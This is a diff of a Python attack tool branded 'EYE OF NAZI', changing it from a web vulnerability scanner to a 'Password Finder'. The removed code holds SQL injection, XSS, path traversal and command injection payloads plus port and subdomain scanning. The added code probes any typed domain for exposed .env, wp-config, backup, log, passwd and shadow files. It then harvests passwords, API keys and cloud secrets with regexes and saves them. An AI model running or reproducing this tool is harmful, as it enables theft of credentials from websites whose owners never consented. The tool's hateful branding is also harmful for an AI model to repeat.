@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# EYE OF NAZI v49.0 - SIMPLE EDITION
+# EYE OF NAZI v50.0 - PASSWORD FINDER
 # Made by Cyber Kurd Team
 
-import sys, os, re, ssl, time, json, socket
+import sys, os, re, ssl, time, json
 import urllib.parse, urllib.request, urllib.error
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -17,55 +17,83 @@ LOGO = r"""
    ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
 \033[0m\033[93m\033[1m                    EYE OF NAZI
 \033[96m=============================================================\033[0m
-\033[97m\033[1m              SIMPLE EDITION v49.0\033[0m
+\033[97m\033[1m              PASSWORD FINDER v50.0\033[0m
 \033[2m              Made by Cyber Kurd Team\033[0m
 \033[96m=============================================================\033[0m
 """
 
-SQ_PAYLOADS = ["'", "\"", "'--", "1' OR '1'='1", "1' OR 1=1--",
-               "1' AND 1=1--", "admin'--", "' UNION SELECT NULL--",
-               "1' ORDER BY 100--", "1' AND SLEEP(3)--"]
+# Password files to scan
+PASSWORD_FILES = [
+    '.env', '.env.local', '.env.production', '.env.backup', '.env.dev',
+    '.env.test', '.env.staging', '.env.old', '.env.save', '.env.bak',
+    'wp-config.php', 'wp-config.php.bak', 'wp-config.php~',
+    'wp-config.php.old', 'wp-config.php.save', 'wp-config.php.orig',
+    'config.php', 'config.php.bak', 'config.php~',
+    'configuration.php', 'configuration.php.bak',
+    'config.inc.php', 'config.json', 'config.yml', 'config.yaml',
+    'config.xml', 'config.old', 'config.backup', 'config.save',
+    'settings.py', 'settings.php', 'settings.json',
+    'database.yml', 'database.php', 'database.sql',
+    'db.php', 'db.php.bak', 'db.sql', 'db_backup.sql',
+    'database.sql.gz', 'db.sql.gz', 'dump.sql',
+    '.htaccess', '.htpasswd', 'web.config', 'nginx.conf',
+    'config.txt', 'config.cfg', 'config.ini',
+    'credentials.json', 'secrets.json', 'passwords.txt',
+    'passwd', 'shadow', 'passwords',
+    'admin.php', 'admin/config.php', 'admin/config.json',
+    'includes/config.php', 'includes/db.php',
+    'application/config.php', 'application/database.php',
+    'app/config.php', 'app/config.json',
+]
 
-XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
-                "<svg onload=alert(1)>", "\"><script>alert(1)</script>"]
+# Patterns to find passwords
+PASSWORD_PATTERNS = [
+    r'password["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'passwd["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'pwd["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'pass["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'secret["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'apikey["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'token["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'access[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'secret[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'private[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'auth[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'db[_-]?pass(word)?["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'mysql[_-]?pass(word)?["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'pgsql[_-]?pass(word)?["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
+    r'db_password\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'DB_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'DB_PASS\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'MYSQL_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'DATABASE_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'SMTP_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'MAIL_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'ADMIN_PASSWORD\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'JWT_SECRET\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'APP_KEY\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'APP_SECRET\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'AWS_SECRET[_-]?ACCESS[_-]?KEY\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'SECRET_KEY\s*=\s*["\']([^"\'\s]{4,80})["\']',
+    r'API_SECRET\s*=\s*["\']([^"\'\s]{4,80})["\']',
+]
 
-LFI_PAYLOADS = ["../../../../../../etc/passwd",
-                "../../../../../../etc/hosts",
-                "/etc/passwd",
-                "....//....//....//etc/passwd"]
+# Common CMS config paths
+WP_CONFIG_PATHS = [
+    'wp-config.php', 'wp-config.php.bak', 'wp-config.php~',
+    'wp-config.php.old', 'wp-config.php.save', 'wp-config.php.orig',
+    'wp-config.php.txt', 'wp-config.txt',
+    'wp-content/wp-config.php', 'wp-admin/wp-config.php',
+    'wp-config-sample.php',
+]
 
-RCE_PAYLOADS = [";id", "|id", "&&id", "$(id)", ";whoami", "|whoami"]
-
-SQL_ERRORS = ["sql syntax", "warning: mysql", "unclosed quotation",
-              "odbc sql server", "postgresql", "mariadb", "sqlstate"]
-
-LFI_IND = ["root:x:0:0", "daemon:x:", "www-data:", "[extensions]"]
-RCE_IND = ["uid=", "gid=", "www-data", "GNU/Linux"]
-
-SEC_HDRS = ['Strict-Transport-Security', 'X-Frame-Options',
-            'X-Content-Type-Options', 'Content-Security-Policy']
-
-PATHS = ['.env', '.env.local', '.env.production', '.git/config',
-         '.git/HEAD', '.htaccess', '.htpasswd', 'web.config',
-         'wp-config.php.bak', 'wp-config.php~', 'config.php.bak',
-         'backup.zip', 'backup.tar.gz', 'backup.sql', 'db.sql',
-         'www.zip', 'site.zip', 'database.sql', 'dump.sql',
-         'admin', 'admin/', 'admin.php', 'wp-admin/', 'wp-login.php',
-         'phpmyadmin', 'pma', 'cpanel', 'webmail', 'phpinfo.php',
-         'info.php', 'test.php', 'server-status', 'robots.txt',
-         'sitemap.xml', 'security.txt', 'error.log', 'access.log',
-         'wp-json/wp/v2/users', 'xmlrpc.php', 'readme.html',
-         'api/', 'api/v1/', 'graphql', 'swagger.json',
-         'uploads/', 'files/', 'tmp/', 'install/', 'setup/',
-         'db.php', 'database.php', 'README.md', 'package.json',
-         'composer.json', 'Dockerfile']
-
-PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
-         1433, 3306, 3389, 5432, 6379, 8080, 8443]
-
-SUBDOMAINS = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test',
-              'blog', 'shop', 'cdn', 'static', 'app', 'portal',
-              'vpn', 'git', 'webmail', 'secure', 'login']
+ENV_PATHS = [
+    '.env', '.env.local', '.env.production', '.env.backup',
+    '.env.dev', '.env.test', '.env.staging', '.env.old',
+    '.env.save', '.env.bak', '.env.example', '.env.sample',
+    'env', 'env.txt', '.env.txt',
+]
 
 
 class Client:
@@ -75,7 +103,7 @@ class Client:
         self.proxy = proxy
         self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"
 
-    def req(self, url, data=None, method=None):
+    def req(self, url):
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
@@ -87,314 +115,173 @@ class Client:
         hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
         if self.cookie:
             hdrs['Cookie'] = self.cookie
-        r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
-        t0 = time.time()
+        r = urllib.request.Request(url, headers=hdrs)
         try:
             rp = op.open(r, timeout=self.timeout)
             body = rp.read()
-            return {'s': rp.getcode(), 'h': dict(rp.headers),
-                    't': body.decode('utf-8', 'ignore'),
-                    'n': len(body), 'dt': time.time() - t0, 'err': None}
+            return {'s': rp.getcode(), 't': body.decode('utf-8', 'ignore'),
+                    'n': len(body), 'err': None}
         except urllib.error.HTTPError as e:
             try:
                 body = e.read()
             except Exception:
                 body = b''
-            return {'s': e.code, 'h': dict(e.headers) if e.headers else {},
-                    't': body.decode('utf-8', 'ignore'),
-                    'n': len(body), 'dt': time.time() - t0, 'err': None}
+            return {'s': e.code, 't': body.decode('utf-8', 'ignore'),
+                    'n': len(body), 'err': None}
         except Exception as e:
-            return {'s': 0, 'h': {}, 't': '', 'n': 0,
-                    'dt': time.time() - t0, 'err': str(e)}
+            return {'s': 0, 't': '', 'n': 0, 'err': str(e)}
 
 
-class Scan:
-    def __init__(self, url, cl, threads=30):
+class PasswordFinder:
+    def __init__(self, url, cl, threads=20):
         self.url = url.rstrip('/')
         self.cl = cl
         self.threads = threads
-        self.f = []
-        self.nt = 0
-        self.np = 0
-        self.npath = 0
-        self.techs = []
-        self.waf = []
+        self.found = []
+        self.scanned = 0
+        self.checked = 0
 
-    def add(self, u, p, t, pl, ev, sev):
-        self.f.append({'url': u, 'param': p, 'type': t, 'payload': pl,
-                       'evidence': ev[:200] if ev else '', 'severity': sev})
-        icons = {'SQLI': '\033[41m\033[97m[SQLi]\033[0m',
-                 'XSS': '\033[43m[XSS]\033[0m',
-                 'LFI': '\033[95m[LFI]\033[0m',
-                 'RCE': '\033[41m\033[97m[RCE]\033[0m',
-                 'SSRF': '\033[94m[SSRF]\033[0m',
-                 'REDIR': '\033[96m[REDIR]\033[0m',
-                 'CRLF': '\033[93m[CRLF]\033[0m',
-                 'HEADER': '\033[2m[HDR]\033[0m',
-                 'PATH': '\033[92m[PATH]\033[0m',
-                 'PORT': '\033[93m[PORT]\033[0m',
-                 'SUB': '\033[94m[SUB]\033[0m'}
-        icon = icons.get(t, '[' + t + ']')
-        print("\n  " + icon + " \033[1m" + sev + "\033[0m")
-        print("    URL    : " + u[:120])
-        if p:
-            print("    Param  : \033[93m" + p + "\033[0m")
-        if pl:
-            print("    Payload: " + pl[:80])
-        if ev:
-            print("    Proof  : " + ev[:200])
+    def add(self, url, password, source):
+        self.found.append({'url': url, 'password': password, 'source': source})
+        print("\n  \033[41m\033[97m[PASSWORD]\033[0m \033[1mCRITICAL\033[0m")
+        print("    URL     : " + url[:120])
+        print("    Source  : " + source)
+        print("    Password: \033[93m" + password[:80] + "\033[0m")
 
-    def inject(self, url, p, pl):
-        pr = urllib.parse.urlparse(url)
-        qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
-        qs[p] = [pl]
-        new_q = urllib.parse.urlencode(qs, doseq=True)
-        return urllib.parse.urlunparse(
-            (pr.scheme, pr.netloc, pr.path, pr.params, new_q, pr.fragment))
-
-    def params(self, url):
-        q = urllib.parse.urlparse(url).query
-        if not q:
-            return []
-        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys())
-
-    def scan_url(self, url):
-        for p in self.params(url):
-            self.np += 1
-            print("  \033[2m->\033[0m \033[93m" + p + "\033[0m @ " + url[:65])
-            base = self.cl.req(url)
-            b = base['t'] if not base['err'] else ''
-            for pl in SQ_PAYLOADS:
-                r = self.cl.req(self.inject(url, p, pl))
-                if r['err']:
-                    continue
-                found = False
-                for err in SQL_ERRORS:
-                    if err in r['t'].lower():
-                        self.add(url, p, 'SQLI', pl, "DB err: " + err, "CRITICAL")
-                        found = True
-                        break
-                if found:
-                    break
-            for pl in XSS_PAYLOADS:
-                r = self.cl.req(self.inject(url, p, pl))
-                if r['err']:
-                    continue
-                if pl in r['t']:
-                    self.add(url, p, 'XSS', pl, "Reflected", "HIGH")
-                    break
-            for pl in LFI_PAYLOADS:
-                r = self.cl.req(self.inject(url, p, pl))
-                if r['err']:
-                    continue
-                found = False
-                for ind in LFI_IND:
-                    if ind in r['t'] and ind not in b:
-                        self.add(url, p, 'LFI', pl, "Leak: " + ind, "CRITICAL")
-                        found = True
-                        break
-                if found:
-                    break
-            for pl in RCE_PAYLOADS:
-                r = self.cl.req(self.inject(url, p, pl))
-                if r['err']:
-                    continue
-                found = False
-                for ind in RCE_IND:
-                    if ind in r['t'] and ind not in b:
-                        self.add(url, p, 'RCE', pl, "Output: " + ind, "CRITICAL")
-                        found = True
-                        break
-                if found:
-                    break
-
-    def check_headers(self, url):
-        r = self.cl.req(url)
-        if r['err']:
-            return
-        missing = []
-        for h in SEC_HDRS:
-            found = False
-            for k in r['h']:
-                if h.lower() == k.lower():
-                    found = True
-                    break
-            if not found:
-                missing.append(h)
-        if missing:
-            self.add(url, '', 'HEADER', '',
-                     "Missing: " + ", ".join(missing), "LOW")
-
-    def fingerprint(self, url):
-        r = self.cl.req(url)
-        if r['err']:
-            return []
-        det = []
-        text_low = r['t'].lower()
-        hdr_str = str(r['h']).lower()
-        techs = [('WordPress', 'wp-content'), ('WordPress', 'wp-includes'),
-                 ('Drupal', 'drupal'), ('Joomla', 'joomla'),
-                 ('PHP', 'phpsessid'), ('nginx', 'nginx'),
-                 ('Apache', 'apache'), ('Cloudflare', 'cloudflare'),
-                 ('Cloudflare', 'cf-ray'), ('React', 'react'),
-                 ('jQuery', 'jquery'), ('LiteSpeed', 'litespeed')]
-        for name, sign in techs:
-            if sign in text_low or sign in hdr_str:
-                if name not in det:
-                    det.append(name)
-        return det
-
-    def detect_waf(self, url):
-        test_url = url.rstrip('/') + '/?x=' + urllib.parse.quote("' OR 1=1--<script>alert(1)</script>")
-        r = self.cl.req(test_url)
-        if r['err']:
-            return []
-        h_low = str(r['h']).lower()
-        b_low = r['t'].lower()
-        det = []
-        wafs = [('Cloudflare', 'cf-ray'), ('Cloudflare', 'cloudflare'),
-                ('AWS WAF', 'x-amzn-requestid'), ('Sucuri', 'x-sucuri-id'),
-                ('ModSecurity', 'mod_security'), ('Wordfence', 'wordfence')]
-        for name, sign in wafs:
-            if sign in h_low or sign in b_low:
-                if name not in det:
-                    det.append(name)
-        return det
-
-    def check_path(self, base, path):
-        url = base.rstrip('/') + '/' + path.lstrip('/')
-        r = self.cl.req(url)
-        if r['err']:
-            return None
-        if r['s'] in (200, 301, 302, 401, 403):
-            return {'url': url, 's': r['s'], 'n': r['n'], 'path': path}
-        return None
-
-    def scan_paths(self, base):
-        print("\n\033[96m[*]\033[0m Scanning " + str(len(PATHS)) + " paths...")
-        with ThreadPoolExecutor(max_workers=self.threads) as ex:
-            futures = []
-            for p in PATHS:
-                futures.append(ex.submit(self.check_path, base, p))
-            for fut in as_completed(futures):
-                try:
-                    res = fut.result()
-                    if res:
-                        self.npath += 1
-                        if res['s'] == 200:
-                            sev = "MEDIUM"
-                            high_keys = ['.env', '.git', 'backup', 'wp-config', 'sql']
-                            for x in high_keys:
-                                if x in res['path']:
-                                    sev = "HIGH"
-                                    break
-                            msg = "Status " + str(res['s']) + " - " + str(res['n']) + "B"
-                            self.add(res['url'], '', 'PATH', '', msg, sev)
-                        elif res['s'] in (401, 403):
-                            self.add(res['url'], '', 'PATH', '',
-                                     "Protected (" + str(res['s']) + ")", "INFO")
-                except Exception:
-                    pass
-
-    def enum_subdomains(self, domain):
-        print("\n\033[96m[*]\033[0m Subdomain Enumeration...")
-        found = []
-        with ThreadPoolExecutor(max_workers=20) as ex:
-            futures = []
-            for s in SUBDOMAINS:
-                futures.append((s, ex.submit(self.cl.req, "http://" + s + "." + domain)))
-            for s, fut in futures:
-                try:
-                    res = fut.result()
-                    if not res['err'] and res['s'] in (200, 301, 302, 401, 403):
-                        url = "http://" + s + "." + domain
-                        found.append(url)
-                        self.add(url, '', 'SUB', '',
-                                 "Subdomain (" + str(res['s']) + ")", "MEDIUM")
-                except Exception:
-                    pass
-        print("  \033[92m[+]\033[0m Found " + str(len(found)) + " subdomain(s)")
-
-    def scan_ports(self, host):
-        print("\n\033[96m[*]\033[0m Port Scanning " + host + "...")
-        found = []
-        for p in PORTS:
+    def extract_passwords(self, text):
+        results = []
+        for pat in PASSWORD_PATTERNS:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                result = s.connect_ex((host, p))
-                s.close()
-                if result == 0:
-                    found.append(p)
-                    self.add(host + ":" + str(p), '', 'PORT', '',
-                             "Port " + str(p) + " open", "MEDIUM")
+                matches = re.findall(pat, text, re.IGNORECASE)
+                for m in matches:
+                    if isinstance(m, tuple):
+                        for x in m:
+                            if x and 4 <= len(x) <= 80:
+                                results.append(x)
+                    elif m and 4 <= len(m) <= 80:
+                        results.append(m)
             except Exception:
                 pass
-        print("  \033[92m[+]\033[0m Found " + str(len(found)) + " open port(s)")
+        return list(set(results))
 
-    def run_all(self):
+    def check_file(self, base, path):
+        url = base.rstrip('/') + '/' + path.lstrip('/')
+        r = self.cl.req(url)
+        self.checked += 1
+        if r['err'] or r['s'] != 200:
+            return None
+        # Look for password patterns
+        passwords = self.extract_passwords(r['t'])
+        if passwords:
+            for pwd in passwords[:5]:
+                self.add(url, pwd, path)
+            return {'url': url, 'count': len(passwords)}
+        # Also check if it's a config file with sensitive keywords
+        keywords = ['password', 'passwd', 'secret', 'api_key',
+                    'apikey', 'db_pass', 'db_password', 'private_key',
+                    'access_key', 'auth_key', 'smtp_pass', 'jwt_secret']
+        text_low = r['t'].lower()
+        for kw in keywords:
+            if kw in text_low:
+                self.add(url, '(keyword found: ' + kw + ')', path)
+                return {'url': url, 'count': 1}
+        return None
+
+    def scan(self):
         print("\n\033[96m" + "=" * 60 + "\033[0m")
         print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
         print("\033[96m" + "=" * 60 + "\033[0m")
 
-        print("\n\033[96m[1/7]\033[0m Security Headers...")
-        self.check_headers(self.url)
+        # Step 1 - Config files
+        print("\n\033[96m[1/4]\033[0m Config Files (" + str(len(PASSWORD_FILES)) + ")...")
+        all_paths = list(set(PASSWORD_FILES + WP_CONFIG_PATHS + ENV_PATHS))
+        with ThreadPoolExecutor(max_workers=self.threads) as ex:
+            futures = []
+            for p in all_paths:
+                futures.append(ex.submit(self.check_file, self.url, p))
+            for fut in as_completed(futures):
+                try:
+                    res = fut.result()
+                    if res:
+                        self.scanned += 1
+                except Exception:
+                    pass
 
-        print("\n\033[96m[2/7]\033[0m Fingerprinting...")
-        techs = self.fingerprint(self.url)
-        if techs:
-            print("  \033[92m[+]\033[0m " + ", ".join(techs))
-            self.techs = techs
+        # Step 2 - Common admin paths
+        print("\n\033[96m[2/4]\033[0m Admin Paths...")
+        admin_paths = [
+            'admin.php', 'admin/config.php', 'admin/config.json',
+            'admin/settings.php', 'admin/db.php',
+            'includes/config.php', 'includes/db.php',
+            'includes/settings.php', 'includes/connection.php',
+            'application/config.php', 'application/database.php',
+            'app/config.php', 'app/config.json', 'app/settings.php',
+            'core/config.php', 'system/config.php',
+            'wp-admin/setup-config.php', 'wp-admin/install.php',
+        ]
+        with ThreadPoolExecutor(max_workers=self.threads) as ex:
+            futures = []
+            for p in admin_paths:
+                futures.append(ex.submit(self.check_file, self.url, p))
+            for fut in as_completed(futures):
+                try:
+                    fut.result()
+                except Exception:
+                    pass
 
-        print("\n\033[96m[3/7]\033[0m WAF Detection...")
-        waf = self.detect_waf(self.url)
-        if waf:
-            print("  \033[93m[!]\033[0m WAF: " + ", ".join(waf))
-            self.waf = waf
+        # Step 3 - Backup files
+        print("\n\033[96m[3/4]\033[0m Backup Files...")
+        backup_paths = [
+            'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.rar',
+            'backup.bak', 'backup.old', 'backup-2024.zip',
+            'backup-2023.zip', 'old.zip', 'site_backup.zip',
+            'full_backup.zip', 'db_backup.sql', 'database.sql',
+            'dump.sql', 'db.sql', 'db.sql.gz',
+            'www.zip', 'site.zip', 'web.zip',
+        ]
+        with ThreadPoolExecutor(max_workers=self.threads) as ex:
+            futures = []
+            for p in backup_paths:
+                futures.append(ex.submit(self.check_file, self.url, p))
+            for fut in as_completed(futures):
+                try:
+                    fut.result()
+                except Exception:
+                    pass
 
-        print("\n\033[96m[4/7]\033[0m URL Parameters...")
-        self.nt += 1
-        self.scan_url(self.url)
+        # Step 4 - Log files
+        print("\n\033[96m[4/4]\033[0m Log Files...")
+        log_paths = [
+            'error.log', 'access.log', 'debug.log', 'error_log',
+            'php_error.log', 'php_errorlog', 'logs/error.log',
+            'logs/access.log', 'var/log/apache2/error.log',
+            'wp-content/debug.log', '.log', 'log.txt',
+        ]
+        with ThreadPoolExecutor(max_workers=self.threads) as ex:
+            futures = []
+            for p in log_paths:
+                futures.append(ex.submit(self.check_file, self.url, p))
+            for fut in as_completed(futures):
+                try:
+                    fut.result()
+                except Exception:
+                    pass
 
-        print("\n\033[96m[5/7]\033[0m Sensitive Paths...")
-        self.scan_paths(self.url)
-
-        host = urllib.parse.urlparse(self.url).hostname
-        if host:
-            print("\n\033[96m[6/7]\033[0m Subdomains...")
-            try:
-                self.enum_subdomains(host)
-            except Exception:
-                pass
-
-            print("\n\033[96m[7/7]\033[0m Ports...")
-            try:
-                self.scan_ports(host)
-            except Exception:
-                pass
-
+        # Final report
         print("\n\033[96m" + "=" * 60 + "\033[0m")
-        crit = 0
-        high = 0
-        med = 0
-        for f in self.f:
-            if f['severity'] == 'CRITICAL':
-                crit += 1
-            elif f['severity'] == 'HIGH':
-                high += 1
-            elif f['severity'] == 'MEDIUM':
-                med += 1
-        print("  Findings: \033[1m\033[91m" + str(len(self.f)) + "\033[0m")
-        print("    \033[41m\033[97m CRITICAL \033[0m " + str(crit))
-        print("    \033[43m HIGH     \033[0m " + str(high))
-        print("    \033[93m MEDIUM   \033[0m " + str(med))
+        print("  Files Checked: " + str(self.checked))
+        print("  Files Found: \033[1m\033[91m" + str(self.scanned) + "\033[0m")
+        print("  Passwords Found: \033[1m\033[91m" + str(len(self.found)) + "\033[0m")
         print("\033[96m" + "=" * 60 + "\033[0m\n")
+
+        if not self.found:
+            print("  \033[92mNo passwords found.\033[0m\n")
 
     def save_json(self, filename):
         with open(filename, 'w', encoding='utf-8') as fp:
-            json.dump({'target': self.url, 'findings': self.f},
+            json.dump({'target': self.url, 'passwords': self.found},
                       fp, indent=2, ensure_ascii=False)
-        print("\033[92m[+]\033[0m JSON saved: " + filename)
+        print("\033[92m[+]\033[0m Saved: " + filename)
 
 
 def is_url(text):
@@ -408,10 +295,10 @@ def is_url(text):
 def main():
     print(LOGO)
     print("\n\033[96m" + "=" * 60 + "\033[0m")
-    print("\033[92m  Ready. Type a domain (e.g. kurd4u.com).\033[0m")
+    print("\033[92m  Password Finder - Type a domain to scan.\033[0m")
     print("\033[96m" + "=" * 60 + "\033[0m\n")
 
-    st = {'cookie': None, 'proxy': None, 'threads': 30, 'last': None}
+    st = {'cookie': None, 'proxy': None, 'threads': 20, 'last': None}
 
     while True:
         try:
@@ -463,9 +350,9 @@ def main():
             if conf not in ('y', 'yes', ''):
                 continue
             cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
-            sc = Scan(url, cl, threads=st['threads'])
+            sc = PasswordFinder(url, cl, threads=st['threads'])
             try:
-                sc.run_all()
+                sc.scan()
                 st['last'] = sc
             except KeyboardInterrupt:
                 print("\n\033[93m[!] Stopped\033[0m")
